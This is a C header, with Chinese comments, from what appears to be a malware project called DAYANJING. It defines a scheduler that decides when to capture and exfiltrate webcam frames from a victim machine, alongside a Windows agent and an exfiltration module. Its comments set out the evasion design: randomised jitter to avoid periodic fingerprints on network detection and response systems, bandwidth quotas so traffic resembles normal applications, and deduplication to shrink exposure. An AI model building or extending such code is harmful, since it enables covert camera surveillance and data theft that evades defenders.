/*
 * DAYANJING v4 — exfil_sched.h
 *
 * 采集调度层：决定"什么时候采、采多少、要不要发"。
 *
 * ====================================================================
 * 为什么必须单独有这一层
 * ====================================================================
 * 21_exfil 目前是"采一帧发一帧"。这在真实目标上是三个问题叠加：
 *
 *   1) 带宽：摄像头 320x240 的 JPEG 实测约 100KB（见 cam_jpeg 探测容量
 *      缺陷的修复记录）。持续回传会占满链路，且与正常应用流量形态明显不同。
 *   2) 周期指纹：固定间隔采集是强特征。等间隔的信元流在 NDR 侧一眼可辨。
 *   3) 无效帧：摄像头对着静态场景时，连续帧内容几乎相同。全发等于
 *      既浪费带宽又放大暴露面，收益为零。
 *
 * 本层职责（只此三点）：
 *   1. 触发模式：按需单帧 / 连续采集 / 停止
 *   2. 速率治理：最小间隔 + 抖动 + 突发上限 + 滑动窗口配额
 *   3. 去重：与上一帧内容相同则跳过，不占带宽
 *
 * 本层不采集、不加密、不发包 —— 只做决策。采集与回传仍由 agent_windows
 * 与 21_exfil 负责。决策与执行分离，使调度策略可独立测试。
 *
 * ====================================================================
 * 两个必须做对的工程决定
 * ====================================================================
 * 一、时间必须注入，不能读系统时钟。
 *     调度逻辑若内部调用 clock_gettime，测试就只能靠 sleep 或实时期待，
 *     既慢又不稳定。所有函数接收 now_us，测试可把"时间"直接推进到
 *     任意点验证窗口滑动与配额恢复 —— 这是能测出配额 bug 的前提。
 *
 * 二、抖动必须可复现。
 *     用 xorshift64 而非 rand()：rand() 状态是全局的，会被其它代码干扰，
 *     且不可注入种子，导致抖动范围无法断言。本层自带 rng_state，
 *     init 时注入 seed，同 seed 必得同序列 —— 测试据此断言抖动落在
 *     [min_interval, max_interval] 且跨 seed 不同。
 *
 * 注意：xorshift64 状态不能为 0（全零是全零不动点，会永远输出 0，
 * 抖动退化为恒定 min_interval，反而制造出最差的周期指纹）。
 *
 * ====================================================================
 * 去重语义（重要）
 * ====================================================================
 * 去重按 (crc32, len) 判定，不是逐字节比较 —— 逐字节要保留上一帧全部
 * 内容（可达 16MiB），内存代价不可接受。CRC32 + 长度在实测场景下足够。
 *
 * 跳过的帧**仍然推进时间**（更新 next_due），否则 next_due 已过期会让
 * 下一次 poll 立刻又返回 DUE，形成忙循环空转。但跳过的帧**不计入**
 * burst 与窗口配额 —— 它没占用带宽，不应当消耗配额。
 */

#ifndef DAYANJING_EXFIL_SCHED_H
#define DAYANJING_EXFIL_SCHED_H

#include <stdint.h>
#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ---- 通用成功 ---- */
#define EXF_SCHED_OK      0   /* commit：应发送 */

/* ---- poll 返回值 ---- */
#define EXF_SCHED_DUE     2   /* 该采集了 */
#define EXF_SCHED_WAIT    1   /* 运行着，但未到时候 / 配额耗尽 */
/*
 * IDLE 取 3 而非 0：0 已被 EXF_SCHED_OK 占用（commit 的成功返回），
 * 两者若同为 0 会构成重复 case。poll 与 commit 是两个返回域，
 * 调用方应按宏名比较，不要用 "<= 0" 这类数值直觉判断。
 */
#define EXF_SCHED_IDLE    3   /* 未运行（STOP 或突发上限已到） */
#define EXF_SCHED_SKIP   -8   /* commit 时判定：与上一帧重复，不应发送 */

#define EXF_SCHED_ERR_ARG -1  /* 参数非法（空指针、seed 为 0） */
#define EXF_SCHED_ERR_CFG -2  /* 配置非法（max < min、window_max 为 0 等） */

/* ---- 运行模式 ---- */
#define EXF_SCHED_MODE_IDLE      0
#define EXF_SCHED_MODE_ONCE      1   /* 采一帧后自动回到 IDLE */
#define EXF_SCHED_MODE_CONTINUOUS 2  /* 连续采集直到 STOP 或 burst 上限 */

/*
 * 调度配置。
 * 时间单位统一为微秒；字节单位统一为字节。
 */
typedef struct {
    uint64_t min_interval_us;    /* 两帧之间的最小间隔（不含抖动） */
    uint64_t max_interval_us;    /* 抖动后的最大间隔，必须 >= min */
    uint32_t burst_max;          /* 一次 CONTINUOUS 最多帧数；0 = 不限 */
    uint64_t window_us;          /* 配额窗口长度 */
    uint32_t window_max_frames;  /* 窗口内最大帧数；0 = 不限帧数 */
    /*
     * 窗口内最大字节数；0 = 不限字节。
     *
     * 配额是**软上限**：判定发生在发送前、按"已累积值"比较，因此最后
     * 一帧可能使窗口用量略微超出上限。例如上限 250000、每帧 100000，
     * 第 3 次判定时尚为 200000（未超限）故允许发送，发完达 300000，
     * 第 4 帧才被拒 —— 实际发出 3 帧而非 2 帧。
     *
     * 这是有意的取舍：poll 阶段尚未采集，无从预知本帧大小，无法在发送
     * 前做"是否会超限"的精确协商。要硬上限需在采集后、入队前再判一次，
     * 那属于调用方的策略，不在此层。
     */
    uint64_t window_max_bytes;
    int      dedup;              /* 非 0 = 启用去重 */
} exfil_sched_cfg_t;

typedef struct {
    exfil_sched_cfg_t cfg;

    int      mode;               /* 见 EXF_SCHED_MODE_* */
    uint64_t frames_sent;        /* 本次运行已发送帧数（跳过的帧不计） */
    uint64_t last_send_us;       /* 上一帧时间（含被跳过的帧） */
    uint64_t next_due_us;        /* 下一次允许采集的时刻 */

    uint64_t window_start_us;    /* 当前配额窗口起点 */
    uint32_t window_frames;      /* 窗口内已发帧数 */
    uint64_t window_bytes;       /* 窗口内已发字节数 */

    int      has_last;           /* 是否有上一帧指纹（用于去重） */
    uint32_t last_crc;
    size_t   last_len;

    uint64_t rng_state;          /* xorshift64 状态，init 时注入 */
} exfil_sched_t;

/*
 * 初始化调度器。
 *   cfg  可为 NULL —— 取默认配置（保守：1 秒最小间隔、抖动到 2 秒、
 *                     突发 32 帧、10 秒窗口内 8 帧 / 8 MiB、启用去重）
 *   seed 必须非 0（0 会让 xorshift 退化为恒定输出）
 */
int exfil_sched_init(exfil_sched_t *s, const exfil_sched_cfg_t *cfg,
                     uint64_t seed);

/* 清零调度状态（不含密钥材料，但一并清掉 rng 与窗口计数） */
void exfil_sched_wipe(exfil_sched_t *s);

/* 取默认配置 */
void exfil_sched_default_cfg(exfil_sched_cfg_t *cfg);

/*
 * 触发。
 *   start —— 进入 CONTINUOUS
 *   once  —— 进入 ONCE（采一帧后自动 IDLE）
 *   stop  —— 立即回到 IDLE（不清空配额窗口，避免重启即超额）
 */
int exfil_sched_start(exfil_sched_t *s);
int exfil_sched_once(exfil_sched_t *s);
void exfil_sched_stop(exfil_sched_t *s);

/*
 * 询问当前是否该采集。
 *   now_us 由调用方注入。
 * 返回 EXF_SCHED_DUE / WAIT / IDLE，负值表示参数错误。
 *
 * 窗口滑动在此处发生：若 now 已越过当前窗口，配额计数自动重置。
 * 滑动按整窗口推进（而非把起点设为 now），避免长空闲后窗口起点被
 * 不断后移、配额被"攒"起来一次性爆发的错误行为。
 */
int exfil_sched_poll(exfil_sched_t *s, uint64_t now_us);

/*
 * 提交一帧的采集结果（无论是否发送都要调用，否则时间不推进）。
 *   crc  本帧 CRC32（去重判据）
 *   len  本帧字节数（配额判据）
 *
 * 返回：
 *   EXF_SCHED_OK(0) —— 应发送；配额与计数已推进
 *   EXF_SCHED_SKIP  —— 与上一帧重复，不应发送；时间已推进，配额未消耗
 *
 * 注意：调用 commit 前应先取得 poll == DUE；对 WAIT/IDLE 状态调用
 * 仍会推进时间与计数（不校验前置状态），调用方需自行保证顺序。
 */
int exfil_sched_commit(exfil_sched_t *s, uint64_t now_us,
                       uint32_t crc, size_t len);

/* 距离下一次允许采集还剩多少微秒；已到期返回 0 */
uint64_t exfil_sched_wait_us(const exfil_sched_t *s, uint64_t now_us);

/* 只读查询：当前窗口内已用帧数 / 字节数 */
void exfil_sched_usage(const exfil_sched_t *s,
                       uint32_t *frames, uint64_t *bytes);

const char *exfil_sched_errstr(int e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_SCHED_H */
